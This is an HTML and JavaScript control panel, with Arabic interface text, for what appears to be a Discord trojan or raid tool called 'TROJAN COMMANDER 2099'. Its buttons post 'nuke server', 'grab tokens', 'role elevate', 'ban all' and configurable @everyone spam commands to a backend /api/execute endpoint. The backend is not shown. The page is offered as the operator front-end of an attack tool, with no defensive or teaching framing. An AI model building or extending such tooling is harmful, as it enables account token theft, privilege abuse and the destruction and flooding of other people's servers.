<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Trojan Dashboard - Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0f1e;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .header {
            background: #0d1117;
            border: 1px solid #2ea043;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h2 {
            color: #ff4d4d;
        }
        .logout-btn {
            background: #21262d;
            color: #ff4d4d;
            border: 1px solid #ff4d4d;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
        }
        .card {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .card-title {
            color: #2ea043;
            font-size: 20px;
            margin-bottom: 15px;
            border-bottom: 1px solid #30363d;
            padding-bottom: 8px;
        }
        .btn-group {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .attack-btn {
            background: #21262d;
            border: 1px solid #ff4d4d;
            padding: 12px 20px;
            color: #ff4d4d;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.1s;
        }
        .attack-btn:hover {
            background: #ff4d4d;
            color: #000;
            box-shadow: 0 0 10px #ff4d4d;
        }
        .output {
            background: #010409;
            border: 1px solid #2ea043;
            padding: 15px;
            border-radius: 8px;
            color: #00ff99;
            font-family: monospace;
            font-size: 13px;
            min-height: 200px;
            white-space: pre-wrap;
            overflow-y: auto;
        }
        .spam-input {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .spam-input input {
            flex: 1;
            background: #010409;
            border: 1px solid #30363d;
            color: white;
            padding: 8px;
            border-radius: 6px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>💀 TROJAN COMMANDER 2099 💀</h2>
            <button class="logout-btn" id="logoutBtn">⛔ LOGOUT</button>
        </div>
        
        <div class="card">
            <div class="card-title">⚔️ ATTACK COMMANDS</div>
            <div class="btn-group">
                <button class="attack-btn" data-cmd="nuke">💣 NUKE SERVER</button>
                <button class="attack-btn" data-cmd="token-grab">🎯 GRAB TOKENS</button>
                <button class="attack-btn" data-cmd="role-elevate">👑 ROLE ELEVATE</button>
                <button class="attack-btn" data-cmd="ban-all">🚫 BAN ALL</button>
            </div>
            
            <div class="card-title" style="margin-top: 15px;">📨 SPAM</div>
            <div class="spam-input">
                <input type="number" id="spamCount" placeholder="عدد الرسائل" value="30">
                <input type="text" id="spamMsg" placeholder="الرسالة" value="@everyone 🔥 TROJAN 2099 🔥">
                <button class="attack-btn" data-cmd="spam" style="margin:0;">✉️ SEND SPAM</button>
            </div>
        </div>
        
        <div class="card">
            <div class="card-title">📟 OUTPUT LOG</div>
            <div class="output" id="output">
                > جاهز لتنفيذ الأوامر...
            </div>
        </div>
    </div>

    <script>
        function addOutput(text) {
            const output = document.getElementById('output');
            output.innerHTML += `\n[${new Date().toLocaleTimeString()}] > ${text}`;
            output.scrollTop = output.scrollHeight;
        }
        
        async function executeCommand(command, params = {}) {
            addOutput(`تنفيذ: ${command}...`);
            try {
                const res = await fetch('/api/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command, params })
                });
                const data = await res.json();
                addOutput(`النتيجة: ${JSON.stringify(data, null, 2)}`);
            } catch(e) {
                addOutput(`خطأ: ${e.message}`);
            }
        }
        
        // أزرار الهجوم
        document.querySelectorAll('.attack-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const cmd = btn.getAttribute('data-cmd');
                if (cmd === 'spam') {
                    const count = document.getElementById('spamCount').value;
                    const message = document.getElementById('spamMsg').value;
                    executeCommand('spam', { count: parseInt(count), message });
                } else {
                    executeCommand(cmd);
                }
            });
        });
        
        // تسجيل الخروج
        document.getElementById('logoutBtn').addEventListener('click', async () => {
            await fetch('/api/logout', { method: 'POST' });
            window.location.href = '/';
        });
    </script>
</body>
</html>
